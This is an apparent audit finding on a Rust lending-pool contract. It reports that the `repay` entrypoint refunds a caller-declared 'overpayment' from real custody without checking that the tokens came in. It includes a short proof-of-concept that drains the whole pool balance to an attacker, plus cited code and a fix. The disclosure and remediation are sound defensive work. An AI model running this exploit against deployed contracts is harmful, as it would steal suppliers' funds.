### Title
Unverified `repay` overpayment path lets any caller drain the pool's token balance by declaring a fake `amount` against a zero-debt position - (File: contracts/pool/src/ops/repay.rs)

### Summary

The memory-corruption class of CVE-2019-8765 maps onto XOXNO Lending as **accounting/custody corruption producing an arbitrary payout**: the pool's `repay` entrypoint trusts the caller-declared `amount` and `position.scaled_amount` in each `PoolAction`, and refunds the "overpayment" — `amount` minus the position's ceiling-rounded debt — via `transfer_out` from the pool's real token custody, without ever verifying that the declared amount was actually transferred in and without debiting the cash book.

### Finding Description

`repay::accounting` resolves the repayment with `cache.resolve_repay(amount, position)` where both `amount` and `position` come from the caller-supplied `PoolAction` [1](#0-0) . `resolve_repay` treats `amount >= current_debt_ceil` as a full close and returns `overpayment = amount - current_debt_ceil` [2](#0-1) . A caller passing `position.scaled_amount = 0` gets `current_debt_ceil = 0`, so the entire declared `amount` becomes "overpayment", `net_repay = 0`, and the `RepayRoundsToZeroShares` assert passes on its `net_repay == 0` disjunct [3](#0-2) . `apply` then sends `transfer_out(payer, overpayment)` — real tokens — while `cache.credit_cash(net_repay)` credited nothing [4](#0-3) .

The repository's own test proves the drain: `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` calls `client.repay(&payer, &t.ract(0, custody_before))` on a debt-free market and asserts the full pool custody is paid out to an arbitrary `Address::generate` payer with no auth and no inbound transfer [5](#0-4) . The comment there notes the identical shape exists in `ops::recapitalize::apply`. The header comment states "The controller transfers the repay amount into the pool before this call" — the pool itself performs no measured-receipt check, unlike the measured inbound transfers used elsewhere [6](#0-5) . Contrast with `flash::collect_repayment`, which verifies pool balance equality after pulling `transfer_from` [7](#0-6) .

Reachability: `controller::repay` is permissionless (`caller-auth`, anyone may repay any account) and the pool `repay` is callable directly as shown by the test fixture [8](#0-7) .

### Impact Explanation

Theft of user funds. An unprivileged address submits `repay(payer = attacker, actions = [PoolAction { hub_asset, position: { scaled_amount: 0 }, amount = pool_token_balance }])` on any market. The whole balance is classified as overpayment and transferred to the attacker; the cash book is unchanged, so the pool's `cash` still claims those funds exist while custody is empty — suppliers' and borrowers' backing is stolen, matching the "corrupt memory handling → arbitrary code execution" class as corrupt accounting → arbitrary payout.

### Likelihood Explanation

Requires no privileges, no oracle manipulation, no timing: one call with `scaled_amount = 0` and `amount` bounded only by the pool's token balance (larger `amount` fails only at the token `transfer` insufficient-balance check). Works even on markets with real debt because the caller controls the `position` field in the action.

### Recommendation

In `repay::accounting`/`apply`, measure the inbound receipt instead of trusting `action.amount`: snapshot the pool token balance, require `balance_delta == amount` (or cap the refund at the measured delta), and only refund overpayment actually received. Equivalently, gate the `transfer_out` refund by `amount` having been debited from cash (`debit_cash(overpayment)` after crediting the full `amount`), so an unfunded refund fails `require_reserves`/cash underflow instead of paying from other users' custody. Apply the same fix to `ops::recapitalize`, which shares the declared-amount refund shape.

### Proof of Concept

```rust
// Contracts/pool context — mirrors test_unfunded_repay_overpayment_refund_also_pays_out_of_custody
// Attacker holds no position and sends no tokens.
let attacker = Address::generate(&env);
let pool_custody = token::Client::new(&env, &asset).balance(&pool); // e.g. suppliers' USDC

pool_client.repay(
    &attacker,
    &vec![&env, PoolAction {
        hub_asset: key,                          // any listed market
        position: ScaledPositionRaw { scaled_amount: 0 }, // caller-declared, no debt
        amount: pool_custody,                    // entire declared amount becomes "overpayment"
    }],
);
// Result: transfer_out(attacker, pool_custody); state.cash unchanged → book/custody divergence.
```

Confirmed in-repo by `test_unfunded_repay_overpayment_refund_also_pays_out_of_custody` (`contracts/pool/tests/flows.rs:3589-3611`), which asserts the unfunded refund drains real custody while `actual_amount == 0` and the book is untouched.

### Citations

**File:** contracts/pool/src/ops/repay.rs (L1-4)
```rust
//! Repay leg: burn debt shares, credit cash, refund overpayment to the payer.
//!
//! The controller transfers the repay amount into the pool before this call.

```

**File:** contracts/pool/src/ops/repay.rs (L25-34)
```rust
pub(crate) fn apply(
    env: &Env,
    payer: &Address,
    action: &PoolAction,
) -> (PoolPositionMutation, MarketStateSnapshot) {
    let outcome = accounting(env, action);

    outcome.cache.transfer_out(payer, outcome.overpayment);
    (outcome.mutation, outcome.snapshot)
}
```

**File:** contracts/pool/src/ops/repay.rs (L40-52)
```rust
pub(crate) fn accounting(env: &Env, action: &PoolAction) -> RepayOutcome {
    let (mut cache, position) = ops::load_leg(env, action);
    let amount = action.amount;

    let (burned, overpayment) = cache.resolve_repay(amount, position);
    let net_repay = amount
        .checked_sub(overpayment)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));
    assert_with_error!(
        env,
        net_repay == 0 || burned.raw() > 0,
        GenericError::RepayRoundsToZeroShares
    );
```

**File:** common/src/rates/scaling.rs (L178-191)
```rust
    let current_debt_ceil = unscale_borrow_ceil(env, pos_scaled, borrow_index, decimals);
    if amount >= current_debt_ceil {
        (
            pos_scaled,
            amount
                .checked_sub(current_debt_ceil)
                .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow)),
        )
    } else {
        (
            calculate_scaled_borrow_floor(env, amount, decimals, borrow_index),
            0,
        )
    }
```

**File:** contracts/pool/tests/flows.rs (L3589-3611)
```rust
#[test]
fn test_unfunded_repay_overpayment_refund_also_pays_out_of_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);

    let custody_before = token.balance(&t.pool);
    let before = t.state_snapshot();
    assert_eq!(
        before.cash, custody_before,
        "fixture guard: book and custody must start in sync"
    );
    assert_eq!(before.borrowed, 0, "fixture must carry no debt");

    // Nothing transferred in, no debt to retire: the whole amount is "excess".
    let credited = t
        .client()
        .repay(&payer, &t.ract(0, custody_before))
        .get_unchecked(0)
        .actual_amount;
    assert_eq!(credited, 0, "no debt was retired, so nothing is credited");
    assert_unfunded_refund_drained_custody(&t, &payer, custody_before, &before);
}
```

**File:** contracts/pool/src/ops/flash.rs (L166-189)
```rust
fn collect_repayment(
    env: &Env,
    asset: &token::Client,
    pool: &Address,
    receiver: &Address,
    terms: &FlashTerms,
) {
    assert_with_error!(
        env,
        asset.allowance(receiver, pool) >= terms.total_repayment,
        FlashLoanError::InvalidFlashloanRepay
    );
    asset.transfer_from(pool, receiver, pool, &terms.total_repayment);
    require_balance(env, asset, pool, terms.balance_after_repayment);
}

/// Asserts the pool's token balance equals `expected`.
fn require_balance(env: &Env, asset: &token::Client, pool: &Address, expected: i128) {
    assert_with_error!(
        env,
        asset.balance(pool) == expected,
        FlashLoanError::InvalidFlashloanRepay
    );
}
```

**File:** scripts/permissionless_entrypoints.txt (L70-70)
```text
controller::repay | caller-auth | INV-AUTH-03, INV-ACCT-03 | Anyone may repay any account's debt. Funds are pulled from the caller's own balance and credited from the measured receipt; the target's liabilities can only fall.
```
